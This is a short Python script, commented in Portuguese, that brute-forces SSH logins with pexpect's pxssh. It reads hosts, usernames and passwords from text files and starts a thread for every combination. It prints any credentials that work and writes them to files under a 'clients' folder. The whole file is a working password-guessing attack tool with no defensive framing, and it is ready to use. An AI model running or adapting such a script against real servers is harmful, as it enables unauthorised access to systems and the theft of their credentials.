from pexpect import pxssh
import threading

password_found = False

def connect(host, user, password):
    global password_found

    try:
        s = pxssh.pxssh()
        s.login(host, user, password)
        print('[+] Senha encontrada: ' + password)
        password_found = True
        file = open("./clients/" + user + ".txt", "w")
        file.write(f"{host}\n{user}\n{password}")

    except:
        pass

def start():
    hosts_file = open("hosts.txt", 'r')
    users_file = open("users.txt", 'r')
    passwords_file = open("senhas.txt", 'r')

    hosts = []
    users = []
    passwords = []

    for line in hosts_file.readlines():
        hosts.append(line.strip('\r').strip('\n'))

    for line in users_file.readlines():
        users.append(line.strip('\r').strip('\n'))

    for line in passwords_file.readlines():
        passwords.append(line.strip('\r').strip('\n'))

    for host in hosts:
        print(host)
        for user in users:
            print("\t" + user)
            for password in passwords:
                if password_found:
                    break

                t = threading.Thread(target=connect, args=(host,user,password))
                t.start()

            
if __name__ == '__main__':
    start()
